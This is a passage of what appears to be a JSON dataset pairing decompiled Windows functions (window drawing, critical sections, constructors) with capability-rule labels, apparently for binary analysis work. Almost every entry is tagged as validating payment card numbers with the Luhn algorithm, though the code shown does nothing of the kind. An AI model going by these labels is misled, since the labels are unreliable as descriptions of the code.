        "decompiled_code": "\nvoid __fastcall fcn.0042c428(int32_t param_1)\n\n{\n    int16_t aiStack112 [7];\n    uchar auStack98 [86];\n    \n    fcn.0042bb28();\n    if (param_1 == 0) {\n        fcn.004031a8();\n        fcn.0042bd98(0, 0, auStack98);\n    }\n    else {\n        fcn.0041ebbc();\n        if (aiStack112[0] != 0x4d42) {\n            fcn.00427324();\n        }\n        fcn.0042bec0(aiStack112);\n    }\n    return;\n}\n",
        "token_count": 145
    },
    "0042cbb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042cbb0(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    ushort *in_EDX;\n    uint *puVar3;\n    uint *puVar4;\n    uint *in_FS_OFFSET;\n    uint uStackY124;\n    uint uStackY120;\n    uchar *puStackY116;\n    uint var_58h;\n    uint var_44h;\n    uint var_40h;\n    uint *var_4h;\n    \n    *in_EDX = 2;\n    fcn.0042bb38();\n    puVar3 = *(in_EAX + 0x28) + 0x18;\n    puVar4 = &fcn.0042cbb0::var_58h;\n    for (iVar2 = 0x15; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    var_40h = 0;\n    var_44h = 0;\n    puStackY116 = 0x42cbfd;\n    uVar1 = fcn.0042aad4(*(in_EAX + 0x2c), &fcn.0042cbb0::var_58h);\n    *var_4h = uVar1;\n    uStackY120 = 0x42cc2a;\n    uStackY124 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff84;\n    puStackY116 = &stack0xfffffffc;\n    uVar1 = fcn.0042b138();\n    *arg_8h = uVar1;\n    *in_FS_OFFSET = uStackY124;\n    return;\n}\n",
        "token_count": 410
    },
    "0042cc98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042cc98(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.004285f4();\n    *(in_EAX + 0x21) = 1;\n    uVar1 = fcn.004037f0();\n    *(in_EAX + 0x28) = uVar1;\n    fcn.0042a900();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 194
    },
    "0042cf3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0042cf3c(uint param_1, uint *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ah;\n    uint var_4h;\n    \n    puStack32 = 0x42cf55;\n    piVar1 = fcn.004037f0();\n    uStack36 = 0x42cfca;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    uVar2 = (***param_2)();\n    fcn.0041e990(uVar2);\n    (**(*piVar1 + 4))();\n    (***piVar1)();\n    fcn.0041ebbc();\n    fcn.0041ebbc();\n    if (1 < var_ah._2_2_) {\n        fcn.00427330();\n    }\n    fcn.0042cff4();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x42cfea;\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 300
    },
    "0042d13c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.0042d13c(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    int32_t iStack76;\n    uint uStack72;\n    uint uStack68;\n    uchar uStack32;\n    \n    uVar3 = 1;\n    uStack68 = 0;\n    uStack72 = 0x42d14a;\n    iVar1 = sub.user32.dll_GetDC();\n    if (iVar1 != 0) {\n        uStack72 = *0x4858a4;\n        iStack76 = iVar1;\n        iVar2 = sub.gdi32.dll_SelectObject();\n        if (iVar2 != 0) {\n            iVar2 = sub.gdi32.dll_GetTextMetricsA(iVar1, &stack0xffffffb4);\n            if (iVar2 != 0) {\n                uVar3 = uStack32;\n            }\n        }\n        sub.user32.dll_ReleaseDC(0, iVar1);\n    }\n    return uVar3;\n}\n",
        "token_count": 222
    },
    "0042d24c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042d24c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    sub.kernel32.dll_InitializeCriticalSection_1();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = in_EAX + 8;\n    }\n    return in_EAX;\n}\n",
        "token_count": 137
    },
    "0042d2b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042d2b0(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_EnterCriticalSection_1(in_EAX + 8);\n    return;\n}\n",
        "token_count": 43
    },
    "0042d2bc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042d2bc(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.kernel32.dll_LeaveCriticalSection_1(in_EAX + 8);\n    return;\n}\n",
        "token_count": 43
    },
    "0042d47c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0042d47c(void)\n\n{\n    uint *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = *(in_EAX + 4);\n    if (puVar1 == NULL) {\n        return;\n    }\n    uStack28 = 0x42d49a;\n    fcn.0042d2b0();\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *(in_EAX + 4) = *puVar1;\n    *in_FS_OFFSET = uStack36;\n    uStack28 = 0x42d4d0;\n    uStack32 = 0x42d4c8;\n    fcn.0042d2bc();\n    return;\n}\n",
        "token_count": 214
    },
    "0042d87c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042d87c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.004037f0();\n    *(in_EAX + 0x10) = 1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 151
    },
    "0042d928": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042d928(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.004037f0();\n    uVar1 = fcn.004037f0();\n    *(in_EAX + 4) = uVar1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 168
    },
    "0042e788": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042e788(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.004062b0();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 131
    },
    "0042e7c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042e7c4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.004037f0();\n    uVar1 = fcn.0042d87c();\n    *(in_EAX + 0x10) = uVar1;\n    uVar1 = fcn.0042d87c();\n    *(in_EAX + 0x14) = uVar1;\n    uVar1 = fcn.0042d87c();\n    *(in_EAX + 0x18) = uVar1;\n    fcn.004045c8();\n    *(in_EAX + 0x1c) = 1;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 258
    },
    "0042efa0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042efa0(int32_t param_1)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x42f07b;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puVar1 = &stack0xfffffffc;\n    if (param_1 != 0) {\n        fcn.0040461c();\n        puVar1 = puStack36;\n    }\n    puStack36 = puVar1;\n    iVar3 = *(*(in_EAX + 0x14) + 8);\n    if (iVar3 == 0) {\n        fcn.0040c998();\n        fcn.00403fc0();\n    }\n    else if (-1 < iVar3 + -1) {\n        do {\n            fcn.0042d8b8();\n            fcn.004062b0();\n            fcn.004062dc();\n            cVar2 = (**(_pe_dos_header + 0x30))();\n            if (cVar2 != '\\0') {\n                fcn.004062dc();\n                (**(_pe_dos_header + 0x34))();\n                break;\n            }\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x42f082;\n    uStack40 = 0x42f072;\n    fcn.00405080();\n    uStack40 = 0x42f07a;\n    fcn.00406298();\n    return;\n}\n",
        "token_count": 436
    },
    "0042f750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042f750(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    int32_t *in_FS_OFFSET;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.004037f0();\n    sub.kernel32.dll_InitializeCriticalSection_1();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = in_EAX + 4;\n    }\n    return in_EAX;\n}\n",
        "token_count": 145
    },
    "0043057c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043057c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.004304cc();\n    (***0x4845bc)(uVar1);\n    return;\n}\n",
        "token_count": 89
    },
    "004305c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004305c8(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.004304cc();\n    (***0x484578)(uVar1);\n    return;\n}\n",
        "token_count": 76
    },
    "00430674": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430674(uint arg_8h, uint arg_ch, uint *arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint *in_ECX;\n    uint var_1ch;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_1ch = *arg_10h;\n    uStack28 = arg_10h[1];\n    uStack24 = arg_10h[2];\n    uStack20 = arg_10h[3];\n    var_ch = *in_ECX;\n    var_8h = in_ECX[1];\n    var_4h = in_ECX[2];\n    uVar1 = fcn.00404e40(arg_ch, arg_8h, &var_1ch);\n    fcn.00404e30(uVar1);\n    uVar1 = fcn.004304cc();\n    (***0x484744)(uVar1);\n    return;\n}\n",
        "token_count": 239
    },
    "00430b24": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00430b24(char param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack128;\n    uint uStack124;\n    uchar *puStack120;\n    uint uStack116;\n    uint *puStack112;\n    int32_t iStack108;\n    int32_t iStack104;\n    uint uStack100;\n    uint *puStack96;\n    uint uStack92;\n    uint uStack88;\n    int32_t var_44h;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint var_34h;\n    int32_t nLeftRect;\n    int32_t nTopRect;\n    int32_t nRightRect;\n    int32_t nBottomRect;\n    int32_t var_18h;\n    int32_t iStack24;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint hdc;\n    uint var_4h;\n    \n    uStack88 = 0xffffffec;\n    uStack92 = 0x430b3e;\n    var_4h = param_2;\n    uStack92 = fcn.0044407c();\n    puStack96 = 0x430b44;\n    uVar1 = sub.user32.dll_GetWindowLongA();\n    if ((uVar1 & 0x200) != 0) {\n        puStack96 = &fcn.00430b24::nLeftRect;\n        uStack100 = 0x430b59;\n        uStack100 = fcn.0044407c();\n        iStack104 = 0x430b5f;\n        sub.user32.dll_GetWindowRect();\n        iStack104 = -nTopRect;\n        iStack108 = -nLeftRect;\n        puStack112 = &fcn.00430b24::nLeftRect;\n        uStack116 = 0x430b74;\n        sub.user32.dll_OffsetRect();\n        uStack116 = 0x430b7c;\n        uStack116 = fcn.0044407c();\n        puStack120 = 0x430b82;\n        hdc = sub.user32.dll_GetWindowDC();\n        uStack124 = 0x430c7f;\n        uStack128 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff80;\n        var_18h = nLeftRect;\n        iStack24 = nTopRect;\n        var_10h = nRightRect;\n        var_ch = nBottomRect;\n        puStack120 = &stack0xfffffffc;\n        if (param_1 != '\\0') {\n            puStack120 = &stack0xfffffffc;\n            uVar2 = fcn.0044407c(0xfffffff0);\n            uVar1 = sub.user32.dll_GetWindowLongA(uVar2);\n            if (((uVar1 & 0x100000) != 0) && ((uVar1 & 0x200000) != 0)) {\n                sub.user32.dll_GetSystemMetrics(2);\n                sub.user32.dll_GetSystemMetrics(3);\n                sub.user32.dll_InflateRect(&fcn.00430b24::var_18h, 0xfffffffe, 0xfffffffe);\n                fcn.0041b080(&fcn.00430b24::var_44h, var_ch);\n                var_18h = var_44h;\n                iStack24 = iStack68;\n                var_10h = iStack64;\n                var_ch = iStack60;\n                uVar2 = sub.user32.dll_GetSysColorBrush(0xf);\n                sub.user32.dll_FillRect(hdc, &fcn.00430b24::var_18h, uVar2);\n            }\n        }\n        sub.gdi32.dll_ExcludeClipRect(hdc, nLeftRect + 2, nTopRect + 2, nRightRect + -2, nBottomRect + -2);\n        fcn.0043075c();\n        uVar2 = 0;\n        fcn.004305c8(0, &fcn.00430b24::nLeftRect);\n        *in_FS_OFFSET = uVar2;\n        uVar2 = fcn.0044407c(hdc, 0x430c86);\n        sub.user32.dll_ReleaseDC(uVar2);\n        return;\n    }\n    return;\n}\n",
        "token_count": 959
    },
    "00434124": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00434124(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x43413e;\n    (**(*in_EAX + 0xd0))();\n    puStack32 = 0x43414a;\n    (**(*in_EAX + 0xcc))();\n    puStack32 = 0x434154;\n    fcn.0043d7bc();\n    puStack32 = 0x43415a;\n    fcn.00409494();\n    uStack36 = 0x4341ae;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.004094a8();\n    fcn.0043d7cc();\n    fcn.004092f0();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x4341b5;\n    uStack36 = 0x4341ad;\n    fcn.004094f0();\n    return;\n}\n",
        "token_count": 278
    },
    "004341c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004341c0(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x4341d7;\n    (**(*in_EAX + 0xd0))();\n    puStack28 = 0x4341e4;\n    iVar1 = (**(*in_EAX + 0xcc))();\n    puStack28 = 0x4341f1;\n    fcn.004046b8();\n    if (iVar1 != 0) {\n        puStack28 = 0x4341fc;\n        fcn.0043d7bc();\n        puStack28 = 0x434202;\n        fcn.00409494();\n        uStack32 = 0x43424e;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &stack0xfffffffc;\n        fcn.004094a8();\n        fcn.0043d7cc();\n        fcn.00402d34();\n        *in_FS_OFFSET = uStack36;\n        puStack28 = 0x434255;\n        uStack32 = 0x43424d;\n        fcn.004094f0();\n        return;\n    }\n    return;\n}\n",
        "token_count": 320
    },
    "00435c98": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00435c98(uint arg_8h)\n\n{\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00426624();\n    fcn.00426dac();\n    fcn.00426624();\n    fcn.00426dac();\n    return;\n}\n",
        "token_count": 123
    },
    "00435d5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00435d5c(int32_t arg_8h)\n\n{\n    int32_t in_EDX;\n    uint var_ch;\n    uint var_8h;\n    uint lprc;\n    \n    fcn.00426730();\n    *(in_EDX + 0xc) = *(in_EDX + 0xc) + -1;\n    *(in_EDX + 8) = *(in_EDX + 8) + -1;\n    if (0 < arg_8h) {\n        do {\n            arg_8h = arg_8h + -1;\n            fcn.00435c98(&stack0xfffffffc);\n            sub.user32.dll_InflateRect();\n        } while (0 < arg_8h);\n    }\n    *(in_EDX + 0xc) = *(in_EDX + 0xc) + 1;\n    *(in_EDX + 8) = *(in_EDX + 8) + 1;\n    return;\n}\n",
        "token_count": 216
    },
    "00435e60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00435e60(uint arg_8h)\n\n{\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00426624();\n    fcn.0041b058();\n    fcn.0041b058();\n    fcn.0041b058();\n    fcn.00426dac();\n    fcn.00426624();\n    fcn.0041b058();\n    fcn.0041b058();\n    fcn.0041b058();\n    fcn.00426dac();\n    return;\n}\n",
        "token_count": 191
    },
    "0043667c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043667c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    uStack52 = 0x4367de;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack56;\n    (**(*in_EAX + 0x44))();\n    if (*(in_EAX + 0x212) != '\\0') {\n        fcn.00436644(&stack0xfffffffc);\n        fcn.00435d5c(in_EAX[0x85]);\n    }\n    fcn.00435d5c(in_EAX[0x86]);\n    if (*(in_EAX + 0x211) != '\\0') {\n        fcn.00436644(&stack0xfffffffc);\n        fcn.00435d5c(in_EAX[0x85]);\n    }\n    fcn.00430404();\n    cVar1 = fcn.0043050c();\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.0044525c();\n        if (cVar1 != '\\0') goto code_r0x0043674d;\n    }\n    fcn.00426904();\n    fcn.00426ca8();\ncode_r0x0043674d:\n    fcn.00426a20();\n    fcn.00426f6c();\n    iVar2 = fcn.00426ec8();\n    uVar4 = (var_ch + var_14h) - iVar2;\n    var_14h = uVar4 >> 1;\n    if (var_14h < 0) {\n        var_14h = var_14h + ((uVar4 & 1) != 0);\n    }\n    var_ch = iVar2 + var_14h;\n    uVar3 = fcn.0043fb30();\n    fcn.0043d848(0xffffffff, &var_18h, uVar3);\n    uVar3 = fcn.00404a88();\n    uVar3 = fcn.0042704c(uVar3);\n    sub.user32.dll_DrawTextA();\n    *in_FS_OFFSET = uVar3;\n    fcn.004045c8(0x4367e5);\n    return;\n}\n",
        "token_count": 598
    },
    "00437110": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00437110(uint param_1, code *param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint extraout_var;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack40 = 0x437124;\n    sub.user32.dll_GetActiveWindow();\n    puStack40 = 0x43712e;\n    fcn.004540e0();\n    puStack40 = 0x437136;\n    fcn.00453ff4();\n    uStack44 = 0x4371d3;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.0045d0f4(*(*in_EAX + 0x34), in_EAX);\n    *in_FS_OFFSET = &stack0xffffffbc;\n    *0x483b4c = in_EAX;\n    (*param_2)();\n    *in_FS_OFFSET = extraout_var;\n    fcn.0045d150(*(*in_EAX + 0x34), in_EAX);\n    return;\n}\n",
        "token_count": 298
    },
    "004372b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004372b0(void)\n\n{\n    uint uVar1;\n    \n    *0x485a78 = sub.user32.dll_RegisterWindowMessageA(0x437314);\n    *0x485a7c = sub.user32.dll_RegisterWindowMessageA(0x437324);\n    uVar1 = 1;\n    sub.kernel32.dll_GetCurrentThreadId_1();\n    uVar1 = fcn.00409900(uVar1);\n    *0x483b50 = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    return;\n}\n",
        "token_count": 122
    },
    "00437758": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00437758(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.00449c98();\n    *(in_EAX + 0x60) = 0;\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 149
    },
    "00438144": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00438144(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_100h;\n    \n    sub.user32.dll_GetClassNameA(arg_8h, &var_100h, 0x100);\n    iVar1 = fcn.0040939c();\n    if (iVar1 == 0) {\n        *(arg_ch + 4) = arg_8h;\n        *(arg_ch + 0xc) = 1;\n    }\n    return -(*(arg_ch + 0xc) != '\\x01');\n}\n",
        "token_count": 132
    },
    "004381a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004381a0(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_100h;\n    \n    sub.user32.dll_GetClassNameA(arg_8h, &var_100h, 0x100);\n    iVar1 = fcn.00409378();\n    if (iVar1 == 0) {\n        *(arg_ch + 0xd) = 1;\n        *(arg_ch + 8) = arg_8h;\n    }\n    return -(*(arg_ch + 0xd) != '\\x01');\n}\n",
        "token_count": 132
    },
    "004382a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint8_t __fastcall fcn.004382a0(uint param_1, int32_t param_2)\n\n{\n    uint8_t uStack11;\n    \n    uStack11 = *(param_2 + 0xc) >> 8;\n    return uStack11 ^ 1;\n}\n",
        "token_count": 63
    },
    "004383a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004383a4(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00403b58();\n        param_2 = extraout_DL;\n    }\n    fcn.004037f0();\n    fcn.004062b0();\n    if (param_2 != '\\0') {\n        fcn.00403bb0();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 140
    },
    "00438490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00438490(void)\n\n{\n    uint *in_FS_OFFSET;\n    bool bVar1;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x4384e2;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    bVar1 = *0x485a9c == 0;\n    *0x485a9c = *0x485a9c + -1;\n    if (bVar1) {\n        *0x485aa0 = fcn.004383a4();\n        fcn.00406298();\n        fcn.0042e6ac();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 183
    },
    "0043ab0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
